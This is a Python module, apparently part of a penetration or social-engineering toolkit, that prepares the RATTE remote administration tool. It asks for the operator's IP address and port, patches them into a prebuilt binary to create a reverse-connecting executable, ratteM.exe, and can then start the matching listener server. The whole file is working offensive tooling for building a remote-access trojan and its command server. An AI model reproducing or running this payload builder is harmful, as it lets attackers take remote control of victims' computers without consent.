#!/usr/bin/env python
#
# These are required fields
#
import sys
import subprocess
import os

# switch over to import core
sys.path.append("src/core")
# import the core modules
try: reload(core)
except: import core

# "This is RATTE (Remote Administration Tool Tommy Edition) prepare module.It will prepare a custom ratteM.exe."
MAIN="   RATTE (Remote Administration Tool Tommy Edition) Create Payload only. Read the readme/RATTE-Readme.txt first"
AUTHOR="   Thomas Werth"
	
#
# Start ratteserver
#
def ratte_listener_start(port):
		
	subprocess.Popen("src/payloads/ratte/ratteserver %d" % (port), shell=True).wait()
		
def prepare_ratte(ipaddr,ratteport):
	
	print ("   [*] preparing RATTE...")
	# replace ipaddress with one that we need for reverse connection back
	############
	#Load content of RATTE
	############
	fileopen=open("src/payloads/ratte/ratte.binary" , "rb")
	data=fileopen.read()
	fileopen.close()

	############
	#PATCH Server IP into RATTE
	############
	filewrite=open("src/program_junk/ratteM.exe", "wb")

	host=int(len(ipaddr)+1) * "X"
	rPort=int(len(str(ratteport))+1) * "Y"

	filewrite.write(data.replace(str(host), ipaddr+"\x00", 1).replace(str(rPort), str(ratteport)+"\x00", 1) )
	filewrite.close()
	
# def main(): header is required
def main():
	
	#pause=raw_input("This module has finished completing. Press <enter> to continue")
	
	ipaddr=raw_input("   Enter your IP address to connect back on: ")
	try:
		ratteport=int(raw_input("   Enter port RATTE Server should listen on (ex. 8080): "))
		while ratteport==0 or ratteport > 65535:
			ratteport=int(raw_input("   Port must not be equal to javaport! Enter port RATTE Server should listen on (ex. 8080): "))
	except ValueError:
		ratteport=8080
	
	
	############
	# prepare RATTE
	############
	prepare_ratte(ipaddr,ratteport)

	print ("   [*] Payload has been exported to src/program_junk/ratteM.exe")
	
	############
	# start ratteserver 
	############
	prompt=raw_input("   Do you want to start the ratteserver listener now (yes or no): ")
	if prompt == "yes" or prompt == "" or prompt == "y":
		print ("   [*] Starting ratteserver...")
		ratte_listener_start(ratteport)
